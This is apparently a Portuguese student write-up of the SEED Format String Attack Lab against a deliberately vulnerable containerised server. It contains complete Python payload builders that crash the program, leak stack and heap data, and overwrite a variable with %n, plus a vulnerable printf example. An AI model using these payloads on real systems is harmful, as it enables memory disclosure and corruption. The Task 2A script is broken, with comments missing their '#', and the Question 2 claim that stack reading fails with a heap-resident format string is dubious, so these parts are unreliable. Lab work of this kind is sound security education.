# Relatório: Format String Attack Lab

## Questão 1

### Task 1: Crashing the Program

Iniciámos os dois containers com o comando docker-compose.yml, ambos contendo um servidor vulnerável e usámos o endereço 10.9.0.5 do container que executa um programa de 32 bits com vulnerabilidade de formato de string.

![Figura 1](/Images/LOGBOOK6/Task1_image1.png)

*Figura 1: Comando para iniciar os containers usando o ficheiro docker-compose.yml, inicializando os servidores vulneráveis.*

Enviámos uma mensagem de teste para confirmar a conexão:

![Figura 2](/Images/LOGBOOK6/Task1_image2.png)

*Figura 2: Envio da mensagem de teste "hello" para o servidor através do comando echo, para confirmar a conexão.*

E obtivémos o print esperado:

![Figura 3](/Images/LOGBOOK6/Task1_image3.png)

*Figura 3: Output esperado no terminal, mostrando as variáveis e endereços no servidor após a receção da mensagem de teste.*

O ficheiro build_string.py é um script Python desenvolvido para gerar um payload que explora uma vulnerabilidade de "format string" em um programa de servidor vulnerável. A função principal do script é construir um ficheiro, badfile, que contém dados específicos formatados para manipular a memória do programa-alvo e provocar um comportamento anómalo, como um crash.

``` python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0xbfffeeee
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.8x"*12 + "%n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```
Compilámos o script build_string.py e enviámos o payload para o servidor:

![Figura 4](/Images/LOGBOOK6/Task1_image4.png)

*Figura 4: Execução do script build_string.py para gerar o ficheiro badfile com o payload para a Task 1 e envio do conteúdo de badfile ao servidor, mostrando o uso do comando nc para conectar ao endereço 10.9.0.5..*

Observámos o printout do container para verificar se o programa myprintf() não exibe a mensagem de retorno “Returned properly”. Como tal não aconteceu, podemos concluir que o ataque de formato de string teve sucesso.

![Figura 5](/Images/LOGBOOK6/Task1_image5.png)

*Figura 5: Print da consola do container*

### Task 2: Printing Out the Server Program’s Memory

#### Task 2.A: Stack Data

Para a realização desta tarefa, efetuámos algumas alterações no script build_string.py para criar um novo payload que permite imprimir os dados na stack.

```python
#!/usr/bin/python3
import sys

Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

This line shows how to store a 4-byte integer at offset 0
number  = 0xdeadbeef
content[0:4]  =  (number).to_bytes(4,byteorder='little')

This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("abcd").encode('latin-1')

This line shows how to construct a string s with
64 of "%.8x", concatenated with a "%n"
s = "%.8x"*64

The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

Foram necessários 64 format specifiers %.8x para 0xdeadbeef ser impresso. 0xdeadbeef (4 bytes) foi colocado no início do payload e o valor, 64, foi obtido por tentativa e erro.

Compilámos o script build_string.py e enviámos o payload para o servidor:

![Figura 6](/Images/LOGBOOK6/Task2A_image1.png)

*Figura 6: Execução do script build_string.py para gerar o ficheiro badfile com o payload para a Task 2A e envio do conteúdo de badfile ao servidor, mostrando o uso do comando nc para conectar ao endereço 10.9.0.5.*

Observámos a consola do container para verificar o output da stack. Procurámos pelo número 0xdeadbeef nos valores impressos, o que confirma que estás a ler os dados corretos.

![Figura 7](/Images/LOGBOOK6/Task2A_image2.png)

![Figura 8](/Images/LOGBOOK6/Task2A_image3.png)

*Figura 7 e 8: Print da consola do container, exibindo o conteúdo da stack e a confirmação do identificador 0xdeadbeef, indicando que o offset correto foi encontrado.*

#### Task 2.B: Heap Data

Nesta tarefa, modificamos os primeiros 4 bytes do input, substituindo-os pelo endereço da mensagem secreta 0x080b4008, que foi exibido na saída do servidor na etapa anterior ("The secret message's address: 0x080b4008"). Alteramos o último especificador de formato de %x para %s para que a função printf interprete o conteúdo desse endereço como uma string, permitindo exibir a mensagem secreta.

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.8x"*63 + "\n %s"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```
Compilámos o script build_string.py e enviámos o payload para o servidor:

![Figura 9](/Images/LOGBOOK6/Task2B_image1.png)

Observámos a consola do container para verificar o output da stack. Verificámos se ao enviar o payload, o servidor respondia com a mensagem secreta.

![Figura 10](/Images/LOGBOOK6/Task2B_image2.png)

![Figura 11](/Images/LOGBOOK6/Task2B_image3.png)

### Task 3: Modifying the Server Program’s Memory

#### Task 3.A: Change the value to a different value

Nesta tarefa, modificamos os primeiros 4 bytes do input, substituindo-os pelo endereço da target variable 0x080e5068, exibido na saída do servidor na etapa anterior ("The target variable's address: 0x080e5068"). Alteramos o último especificador de formato de %x para %n, de modo que o número de caracteres impressos pela função printf seja armazenado no endereço indicado, permitindo alterar o valor da variável para qualquer outro.

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.8x"*63 + "\n %n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

Compilámos o script build_string.py e enviámos o payload para o servidor:

![Figura 12](/Images/LOGBOOK6/Task3A_image1.png)

Observámos a consola do container para verificar o output da stack. A saída do container confirma que o valor original da variável target (0x11223344) foi alterado para 0x00000202, que corresponde a 514 em decimal. Isso indica que 514 caracteres foram impressos antes de printf processar o último especificador de formato.

![Figura 13](/Images/LOGBOOK6/Task3A_image2.png)

![Figura 14](/Images/LOGBOOK6/Task3A_image3.png)

### Task 3.B: Change the value to 0x5000
Nesta tarefa, o objetivo foi alterar o valor da variável target para 0x5000 (20480 em decimal) utilizando a exploração de vulnerabilidades de formatação de strings. Para alcançar esse resultado, foi necessário construir um payload que, ao ser processado, escrevesse o número total de caracteres impressos no endereço da variável target.

A técnica utilizada baseou-se no uso de modificadores de precisão em conjunto com format specifiers. Especificamente, a string de formatação construída foi:

- "%.8x" * 62: Imprime 62 blocos de 8 dígitos hexadecimais cada, consumindo 496 caracteres.
- "%.19976x": Imprime mais 19976 caracteres, totalizando 20472 caracteres adicionais.
- "%n": Escreve o número total de caracteres impressos (20480 = 20472 + 8 caractéres do endereço) no endereço da variável target (0x080e5068).
O payload gerado foi armazenado em um arquivo chamado badfile, contendo o endereço da variável target, seguido pela string de formatação.

Esse método permitiu a modificação do valor da variável target para 0x5000, conforme evidenciado no output do servidor, validando assim o sucesso da exploração.

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.8x"*62 + "%.19976x" + "%n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

Compilámos o script build_string.py e enviámos o payload para o servidor:

![Figura 15](/Images/LOGBOOK6/Task3B_image1.png)

Observámos a consola do container para verificar o output da stack. A saída do container confirma que o valor original da variável target (0x11223344) foi alterado para 0x5000.

![Figura 16](/Images/LOGBOOK6/Task3B_image2.png)

![Figura 17](/Images/LOGBOOK6/Task3B_image3.png)


## Questão 2

O **CWE-134: Use of Externally-Controlled Format String** descreve o caso em que o programa utiliza uma função que aceita como argumento uma format string que é fornecida por uma fonte exerna. Por exemplo:

```C
#include <stdio.h>

void readtxt(char* name) {
  printf(name); // <- código vulnerável!!! O printf não tem format specifier
}

int main(int argc, char **argv) {
  char buffer[100];
  memcpy(buffer, argv[1], 100);
  readtxt(argv[1]);
  return (0);
}
```

No caso deste exemplo, o `argv[1]` que é passado como argumento para a função `readtxt` onde está a vulnerabilidade está na memória do programa e não na stack. Logo, a format string não necessita necessariamente de estar alocada à stack para existir uma vulnerabilidade.

**Das tarefas realizadas, quais ataques não funcionariam se a format string estivesse a ser alocada na heap e porquê?**

**Task 1: Crashing the Program**
- **Funcionaria?** Sim.
- **Justificação:** Este ataque utiliza a vulnerabilidade de formato de string para provocar um comportamento inesperado no programa, como uma falha ao tentar acessar ou escrever em endereços inválidos. Como o ataque não depende da localização da stack, ele continuaria a funcionar mesmo com a string na heap.

**Task 2A: Printing Out the Server Program’s Stack Memory**
- **Funcionaria?** Não.
- **Justificação** Este ataque depende de ler dados diretamente da stack, usando %x para revelar informações sensíveis como endereços ou valores de variáveis locais. Com a format string na heap, os dados da stack não seriam expostos porque a função printf não teria acesso aos mesmos offsets.

**Task 2B: Printing Out the Server Program’s Heap Data**
- **Funcionaria?** Sim.
- **Justificação** Este ataque foca na leitura de dados armazenados na heap, como a "mensagem secreta". Desde que o endereço da mensagem secreta seja conhecido e a função printf possa interpretar corretamente os valores da heap, o ataque continuará funcional.

**Task 3A: Modifying the Server Program’s Memory (Changing Variable Values)**
- **Funcionaria?** Parcialmente.
- **Justificação** Este ataque usa %n para modificar valores em endereços específicos, como variáveis armazenadas globalmente ou em áreas previsíveis da memória. Se o valor-alvo estiver na stack, o ataque falhará devido à perda de previsibilidade. No entanto, se o endereço for global ou heap, e conhecido, a escrita ainda seria possível.

**Task 3B: Changing the Value to 0x5000**
- **Funcionaria?** Parcialmente.
- **Justificação:** Tal como na Task 3A, o sucesso depende do local da variável. Se a variável-alvo estiver na stack, a escrita falhará. Caso esteja num endereço fixo fora da stack (como numa área global ou heap), o ataque ainda pode ter sucesso.